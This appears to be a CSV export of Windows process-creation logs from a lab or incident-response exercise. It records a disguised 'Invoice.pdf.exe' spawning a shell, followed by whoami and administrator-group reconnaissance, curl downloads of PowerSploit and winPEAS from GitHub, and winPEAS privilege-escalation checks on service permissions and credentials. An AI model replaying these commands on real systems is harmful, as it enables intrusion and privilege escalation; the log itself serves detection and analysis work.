"_time",user,cmdline,name,"parent_name",pid,ppid,path,"parent_path"
"2024-02-02T18:21:24.000+0300",johndoe,"C:\Windows\system32\cmd.exe /c ECHO.C:\Program Files\Parallels\Parallels Tools\Services\prl_tools.exe\x0D","cmd.exe","cmd.exe",0xac4,0x264,"C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"findstr  /i "":\\ everyone authenticated users todos johndoe"" ","findstr.exe","cmd.exe",0x2978,0x264,"C:\Windows\System32\findstr.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"findstr  /i ""(F) (M) (W) :\\"" ","findstr.exe","cmd.exe",0x2e98,0x264,"C:\Windows\System32\findstr.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"icacls  ""C:\Program Files\Parallels\Parallels Tools\Services\prl_tools_service.exe""  ","icacls.exe","cmd.exe",0x16bc,0x264,"C:\Windows\System32\icacls.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"C:\Windows\system32\cmd.exe /c ECHO.C:\Program Files\Parallels\Parallels Tools\Services\prl_tools_service.exe\x0D","cmd.exe","cmd.exe",0xf60,0x264,"C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"findstr  /i "":\\ everyone authenticated users todos johndoe"" ","findstr.exe","cmd.exe",0xed0,0x264,"C:\Windows\System32\findstr.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"findstr  /i ""(F) (M) (W) :\\"" ","findstr.exe","cmd.exe",0x28cc,0x264,"C:\Windows\System32\findstr.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"icacls  ""C:\Program Files\osquery\osqueryd\osqueryd.exe""  ","icacls.exe","cmd.exe",0xec4,0x264,"C:\Windows\System32\icacls.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"C:\Windows\system32\cmd.exe /c ECHO.C:\Program Files\osquery\osqueryd\osqueryd.exe\x0D","cmd.exe","cmd.exe",0x2154,0x264,"C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"findstr  /i "":\\ everyone authenticated users todos johndoe"" ","findstr.exe","cmd.exe",0x1640,0x264,"C:\Windows\System32\findstr.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"findstr  /i ""(F) (M) (W) :\\"" ","findstr.exe","cmd.exe",0x6cc,0x264,"C:\Windows\System32\findstr.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"icacls  ""C:\Program Files\Parallels\Parallels Tools\Services\coherence.exe""  ","icacls.exe","cmd.exe",0x2a04,0x264,"C:\Windows\System32\icacls.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"C:\Windows\system32\cmd.exe /c ECHO.C:\Program Files\Parallels\Parallels Tools\Services\coherence.exe\x0D","cmd.exe","cmd.exe",0xf68,0x264,"C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"find  "":""","find.exe","cmd.exe",0x24bc,0x272c,"C:\Windows\System32\find.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"find  /i /v ""system32""","find.exe","cmd.exe",0x8e0,0x272c,"C:\Windows\System32\find.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"find  /i ""executablepath""","find.exe","cmd.exe",0x1450,0x272c,"C:\Windows\System32\find.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"wmic  process list full","WMIC.exe","cmd.exe",0x2d5c,0x272c,"C:\Windows\System32\wbem\WMIC.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"C:\Windows\system32\cmd.exe /c wmic process list full|find /i ""executablepath""|find /i /v ""system32""|find "":""","cmd.exe","cmd.exe",0x272c,0x264,"C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"tasklist  /SVC","tasklist.exe","cmd.exe",0x2ad4,0x264,"C:\Windows\System32\tasklist.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"/C ECHO. \x1B[33m[+]\x1B[97m RUNNING PROCESSES","cmd.exe","forfiles.exe",0x24cc,0x1338,"C:\Windows\System32\cmd.exe","C:\Windows\System32\forfiles.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"FORFILES.EXE  /P C:\Users\johndoe\ /M winPEAS.bat /C ""CMD /C ECHO. 0x1B[33m[+]0x1B[97m RUNNING PROCESSES""","forfiles.exe","cmd.exe",0x1338,0x4d0,"C:\Windows\System32\forfiles.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"C:\Windows\system32\cmd.exe /c FORFILES.EXE /P C:\Users\johndoe\ /M winPEAS.bat /C ""CMD /C ECHO. 0x1B[33m[+]0x1B[97m RUNNING PROCESSES""","cmd.exe","cmd.exe",0x4d0,0x264,"C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"findstr  /i ""http://""","findstr.exe","cmd.exe",0x11d4,0x264,"C:\Windows\System32\findstr.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"findstr  /i ""wuserver"" ","findstr.exe","cmd.exe",0x2c0c,0x264,"C:\Windows\System32\findstr.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"reg  query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\  ","reg.exe","cmd.exe",0x2c2c,0x264,"C:\Windows\System32\reg.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"/C ECHO. \x1B[33m[+]\x1B[97m WSUS","cmd.exe","forfiles.exe",0x964,0x16e4,"C:\Windows\System32\cmd.exe","C:\Windows\System32\forfiles.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"FORFILES.EXE  /P C:\Users\johndoe\ /M winPEAS.bat /C ""CMD /C ECHO. 0x1B[33m[+]0x1B[97m WSUS""","forfiles.exe","cmd.exe",0x16e4,0x79c,"C:\Windows\System32\forfiles.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"C:\Windows\system32\cmd.exe /c FORFILES.EXE /P C:\Users\johndoe\ /M winPEAS.bat /C ""CMD /C ECHO. 0x1B[33m[+]0x1B[97m WSUS""","cmd.exe","cmd.exe",0x79c,0x264,"C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"/C ECHO. \x1B[33m[+]\x1B[97m Remote Desktop Credentials Manager","cmd.exe","forfiles.exe",0x1960,0x1408,"C:\Windows\System32\cmd.exe","C:\Windows\System32\forfiles.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"FORFILES.EXE  /P C:\Users\johndoe\ /M winPEAS.bat /C ""CMD /C ECHO. 0x1B[33m[+]0x1B[97m Remote Desktop Credentials Manager""","forfiles.exe","cmd.exe",0x1408,0xfcc,"C:\Windows\System32\forfiles.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:21:24.000+0300",johndoe,"C:\Windows\system32\cmd.exe /c FORFILES.EXE /P C:\Users\johndoe\ /M winPEAS.bat /C ""CMD /C ECHO. 0x1B[33m[+]0x1B[97m Remote Desktop Credentials Manager""","cmd.exe","cmd.exe",0xfcc,0x264,"C:\Windows\System32\cmd.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:05:28.000+0300",johndoe,powershell,"powershell.exe","cmd.exe",0x2904,0x14e4,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","\\?\C:\Windows\System32\SecurityHealth\1.0.2306.10002-0\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding","SecurityHealthHost.exe","svchost.exe",0x2f0c,0x378,"C:\Windows\System32\SecurityHealth\1.0.2306.10002-0\SecurityHealthHost.exe","C:\Windows\System32\svchost.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly","taskhostw.exe","svchost.exe",0xe64,0x6f4,"C:\Windows\System32\taskhostw.exe","C:\Windows\System32\svchost.exe"
"2024-02-02T18:05:28.000+0300",johndoe,"curl  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/PowerSploit.psd1 -O C:\Users\johndoe\PowerSploit.psd1","curl.exe","cmd.exe",0x438,0x14e4,"C:\Windows\System32\curl.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","""C:\Windows\SysWOW64\SearchFilterHost.exe"" 828 3140 3260 820 {85EE815A-7738-4808-A14A-3AD87E32A3BF}","SearchFilterHost.exe","SearchIndexer.exe",0x2b48,0x1ba4,"C:\Windows\SysWOW64\SearchFilterHost.exe","C:\Windows\System32\SearchIndexer.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","""C:\Windows\System32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe3_ Global\UsGthrCtrlFltPipeMssGthrPipe3 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" ","SearchProtocolHost.exe","SearchIndexer.exe",0xb98,0x1ba4,"C:\Windows\System32\SearchProtocolHost.exe","C:\Windows\System32\SearchIndexer.exe"
"2024-02-02T18:05:28.000+0300",johndoe,"curl  https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat -O C:\Users\johndoe\winpeas.bat","curl.exe","cmd.exe",0x2690,0x14e4,"C:\Windows\System32\curl.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","C:\Windows\system32\xtac64.exe -p 1684","xtac64.exe","XtaCache.exe",0x1200,0x994,"C:\Windows\System32\xtac64.exe","C:\Windows\System32\XtaCache.exe"
"2024-02-02T18:05:28.000+0300",johndoe,"""C:\Windows\system32\cmd.exe""","cmd.exe","powershell.exe",0x14e4,0x1844,"C:\Windows\System32\cmd.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","\\?\C:\Windows\System32\SecurityHealth\1.0.2306.10002-0\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding","SecurityHealthHost.exe","svchost.exe",0x1ddc,0x378,"C:\Windows\System32\SecurityHealth\1.0.2306.10002-0\SecurityHealthHost.exe","C:\Windows\System32\svchost.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding","WmiPrvSE.exe","svchost.exe",0x13b8,0x378,"C:\Windows\System32\wbem\WmiPrvSE.exe","C:\Windows\System32\svchost.exe"
"2024-02-02T18:05:28.000+0300",johndoe,powershell,"powershell.exe","cmd.exe",0x1844,0x398,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","C:\Windows\system32\svchost.exe -k netsvcs -p -s lfsvc","svchost.exe","services.exe",0x1984,0x2e8,"C:\Windows\System32\svchost.exe","C:\Windows\System32\services.exe"
"2024-02-02T18:05:28.000+0300",johndoe,"""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\119.0.2151.58\msedgewebview2.exe"" --type=renderer --noerrdialogs --user-data-dir=""C:\Users\johndoe\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=424.1301.2520.0 --embedded-browser-webview=1 --first-renderer-process --lang=en-US --device-scale-factor=2 --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=5 --js-flags=""--harmony-weak-refs-with-cleanup-some --expose-gc --ms-user-locale="" --time-ticks-at-unix-epoch=-1706885838132731 --launch-time-ticks=351012877 --mojo-platform-channel-handle=3440 --field-trial-handle=1760,i,17703364955959800508,11569994075076661684,262144 --enable-features=MojoIpcz,UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:1","msedgewebview2.exe","msedgewebview2.exe",0xac8,0x2e0c,"C:\Program Files (x86)\Microsoft\EdgeWebView\Application\119.0.2151.58\msedgewebview2.exe","C:\Program Files (x86)\Microsoft\EdgeWebView\Application\119.0.2151.58\msedgewebview2.exe"
"2024-02-02T18:05:28.000+0300",johndoe,"""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\119.0.2151.58\msedgewebview2.exe"" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-US --service-sandbox-type=service --noerrdialogs --user-data-dir=""C:\Users\johndoe\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=424.1301.2520.0 --embedded-browser-webview=1 --mojo-platform-channel-handle=2260 --field-trial-handle=1760,i,17703364955959800508,11569994075076661684,262144 --enable-features=MojoIpcz,UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:8","msedgewebview2.exe","msedgewebview2.exe",0x2bd8,0x2e0c,"C:\Program Files (x86)\Microsoft\EdgeWebView\Application\119.0.2151.58\msedgewebview2.exe","C:\Program Files (x86)\Microsoft\EdgeWebView\Application\119.0.2151.58\msedgewebview2.exe"
"2024-02-02T18:05:28.000+0300",johndoe,"""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\119.0.2151.58\msedgewebview2.exe"" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --noerrdialogs --user-data-dir=""C:\Users\johndoe\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=424.1301.2520.0 --embedded-browser-webview=1 --mojo-platform-channel-handle=1936 --field-trial-handle=1760,i,17703364955959800508,11569994075076661684,262144 --enable-features=MojoIpcz,UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:3","msedgewebview2.exe","msedgewebview2.exe",0x1a1c,0x2e0c,"C:\Program Files (x86)\Microsoft\EdgeWebView\Application\119.0.2151.58\msedgewebview2.exe","C:\Program Files (x86)\Microsoft\EdgeWebView\Application\119.0.2151.58\msedgewebview2.exe"
"2024-02-02T18:05:28.000+0300",johndoe,"""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\119.0.2151.58\msedgewebview2.exe"" --type=gpu-process --noerrdialogs --user-data-dir=""C:\Users\johndoe\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=424.1301.2520.0 --embedded-browser-webview=1 --gpu-preferences=WAAAAAAAAADgAAAMAAAAAAAAAAAAAAAAAABgAAAAAAA4AAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --mojo-platform-channel-handle=1752 --field-trial-handle=1760,i,17703364955959800508,11569994075076661684,262144 --enable-features=MojoIpcz,UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:2","msedgewebview2.exe","msedgewebview2.exe",0x8e8,0x2e0c,"C:\Program Files (x86)\Microsoft\EdgeWebView\Application\119.0.2151.58\msedgewebview2.exe","C:\Program Files (x86)\Microsoft\EdgeWebView\Application\119.0.2151.58\msedgewebview2.exe"
"2024-02-02T18:05:28.000+0300",johndoe,"""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\119.0.2151.58\msedgewebview2.exe"" --type=crashpad-handler --user-data-dir=C:\Users\johndoe\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler --database=C:\Users\johndoe\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView\Crashpad --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=119.0.6045.123 ""--annotation=exe=C:\Program Files (x86)\Microsoft\EdgeWebView\Application\119.0.2151.58\msedgewebview2.exe"" ""--annotation=prod=Edge WebView2"" --annotation=ver=119.0.2151.58 --initial-client-data=0x15c,0x160,0x164,0x90,0x16c,0x7ffb1ca259d0,0x7ffb1ca259e0,0x7ffb1ca259f0","msedgewebview2.exe","msedgewebview2.exe",0x1a00,0x2e0c,"C:\Program Files (x86)\Microsoft\EdgeWebView\Application\119.0.2151.58\msedgewebview2.exe","C:\Program Files (x86)\Microsoft\EdgeWebView\Application\119.0.2151.58\msedgewebview2.exe"
"2024-02-02T18:05:28.000+0300",johndoe,"""C:\Program Files (x86)\Microsoft\EdgeWebView\Application\119.0.2151.58\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=424.1301.2520.0 --user-data-dir=""C:\Users\johndoe\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=MojoIpcz,msWebView2TreatAppSuspendAsDeviceSuspend,UseNativeThreadPool,UseBackgroundNativeThreadPool --lang=en-US --accept-lang=en-US --mojo-named-platform-channel-pipe=7520.8648.17238060800239101465","msedgewebview2.exe","Widgets.exe",0x2e0c,0x1d60,"C:\Program Files (x86)\Microsoft\EdgeWebView\Application\119.0.2151.58\msedgewebview2.exe","C:\Program Files\WindowsApps\MicrosoftWindows.Client.WebExperience_424.1301.40.0_arm64__cw5n1h2txyewy\Dashboard\Widgets.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","""C:\Program Files\WindowsApps\MicrosoftWindows.Client.WebExperience_424.1301.40.0_arm64__cw5n1h2txyewy\Dashboard\widgetservice.exe"" -RegisterProcessAsComServer -Embedding","WidgetService.exe","svchost.exe",0x500,0x378,"C:\Program Files\WindowsApps\MicrosoftWindows.Client.WebExperience_424.1301.40.0_arm64__cw5n1h2txyewy\Dashboard\WidgetService.exe","C:\Windows\System32\svchost.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","taskhostw.exe Logon","taskhostw.exe","svchost.exe",0x1f18,0x6f4,"C:\Windows\System32\taskhostw.exe","C:\Windows\System32\svchost.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","""C:\Windows\system32\DllHost.exe"" /Processid:{CA6CC9F1-867A-481E-951E-A28C5E4F01EA}","dllhost.exe","svchost.exe",0x25d4,0x378,"C:\Windows\System32\dllhost.exe","C:\Windows\System32\svchost.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","C:\Windows\system32\DllHost.exe /Processid:{6A695947-B2C3-457C-9B12-800EE815E4BF}","dllhost.exe","svchost.exe",0x1a8c,0x378,"C:\Windows\System32\dllhost.exe","C:\Windows\System32\svchost.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","C:\Windows\SysWOW64\DllHost.exe /Processid:{6A695947-B2C3-457C-9B12-800EE815E4BF}","dllhost.exe","svchost.exe",0x770,0x378,"C:\Windows\SysWOW64\dllhost.exe","C:\Windows\System32\svchost.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","C:\Windows\System32\RuntimeBroker.exe -Embedding","RuntimeBroker.exe","svchost.exe",0x988,0x378,"C:\Windows\System32\RuntimeBroker.exe","C:\Windows\System32\svchost.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","""C:\Windows\system32\BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider","backgroundTaskHost.exe","svchost.exe",0x18c8,0x378,"C:\Windows\System32\backgroundTaskHost.exe","C:\Windows\System32\svchost.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","C:\Windows\system32\svchost.exe -k netsvcs -p -s wlidsvc","svchost.exe","services.exe",0x10c4,0x2e8,"C:\Windows\System32\svchost.exe","C:\Windows\System32\services.exe"
"2024-02-02T18:05:28.000+0300",johndoe,"C:\Windows\system32\net1  localgroup administrators","net1.exe","net.exe",0x280,0x1414,"C:\Windows\System32\net1.exe","C:\Windows\System32\net.exe"
"2024-02-02T18:05:28.000+0300",johndoe,"net  localgroup administrators","net.exe","cmd.exe",0x1414,0x398,"C:\Windows\System32\net.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:05:28.000+0300",johndoe,hostname,"HOSTNAME.EXE","cmd.exe",0x1acc,0x398,"C:\Windows\System32\HOSTNAME.EXE","C:\Windows\System32\cmd.exe"
"2024-02-02T18:05:28.000+0300",johndoe,whoami,"whoami.exe","cmd.exe",0x2cb4,0x398,"C:\Windows\System32\whoami.exe","C:\Windows\System32\cmd.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","wmiadap.exe /F /T","WMIADAP.exe","svchost.exe",0xac8,0xd88,"C:\Windows\System32\wbem\WMIADAP.exe","C:\Windows\System32\svchost.exe"
"2024-02-02T18:05:28.000+0300",johndoe,"cmd.exe","cmd.exe","Invoice.pdf.exe",0x398,0x2a2c,"C:\Windows\System32\cmd.exe","C:\Users\johndoe\Downloads\Invoice\Invoice\Invoice.pdf.exe"
"2024-02-02T18:05:28.000+0300",johndoe,"\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1","conhost.exe","Invoice.pdf.exe",0x2acc,0x2a2c,"C:\Windows\System32\conhost.exe","C:\Users\johndoe\Downloads\Invoice\Invoice\Invoice.pdf.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","""C:\Users\johndoe\Downloads\Invoice\Invoice\Invoice.pdf.exe"" ","Invoice.pdf.exe","explorer.exe",0x2a2c,0x1504,"C:\Users\johndoe\Downloads\Invoice\Invoice\Invoice.pdf.exe","C:\Windows\explorer.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","""C:\Windows\system32\AppHostRegistrationVerifier.exe""","AppHostRegistrationVerifier.exe","svchost.exe",0x2a08,0x6f4,"C:\Windows\System32\AppHostRegistrationVerifier.exe","C:\Windows\System32\svchost.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","""C:\Windows\system32\AppHostRegistrationVerifier.exe""","AppHostRegistrationVerifier.exe","svchost.exe",0x8b0,0x6f4,"C:\Windows\System32\AppHostRegistrationVerifier.exe","C:\Windows\System32\svchost.exe"
"2024-02-02T18:05:28.000+0300",johndoe,"""C:\Program Files\Mozilla Firefox\firefox.exe"" -contentproc --channel=6168 -childID 17 -isForBrowser -prefsHandle 6180 -prefMapHandle 6176 -prefsLen 30346 -prefMapSize 243188 -jsInitHandle 1512 -jsInitLen 235124 -parentBuildID 20240118164516 -appDir ""C:\Program Files\Mozilla Firefox\browser"" - {d8e0907a-65c8-4014-b363-b68e748dfe1f} 8556 ""\\.\pipe\gecko-crash-server-pipe.8556"" 29d81fb2698 tab","firefox.exe","firefox.exe",0x2038,0x216c,"C:\Program Files\Mozilla Firefox\firefox.exe","C:\Program Files\Mozilla Firefox\firefox.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","C:\Windows\system32\xtac.exe -p 1f6c","xtac.exe","XtaCache.exe",0xe88,0x994,"C:\Windows\System32\xtac.exe","C:\Windows\System32\XtaCache.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","consent.exe 5716 480 000002A4420242F0","consent.exe","svchost.exe",0xb28,0x1654,"C:\Windows\System32\consent.exe","C:\Windows\System32\svchost.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","""C:\Windows\system32\DllHost.exe"" /Processid:{CA6CC9F1-867A-481E-951E-A28C5E4F01EA}","dllhost.exe","svchost.exe",0x27a0,0x378,"C:\Windows\System32\dllhost.exe","C:\Windows\System32\svchost.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","C:\Windows\system32\DllHost.exe /Processid:{6A695947-B2C3-457C-9B12-800EE815E4BF}","dllhost.exe","svchost.exe",0x2a28,0x378,"C:\Windows\System32\dllhost.exe","C:\Windows\System32\svchost.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","C:\Windows\SysWOW64\DllHost.exe /Processid:{6A695947-B2C3-457C-9B12-800EE815E4BF}","dllhost.exe","svchost.exe",0x2fd4,0x378,"C:\Windows\SysWOW64\dllhost.exe","C:\Windows\System32\svchost.exe"
"2024-02-02T18:05:28.000+0300","JOHNDOE-V-W11$","C:\Windows\system32\svchost.exe -k wusvcs -p -s WaaSMedicSvc","svchost.exe","services.exe",0x2e80,0x2e8,"C:\Windows\System32\svchost.exe","C:\Windows\System32\services.exe"
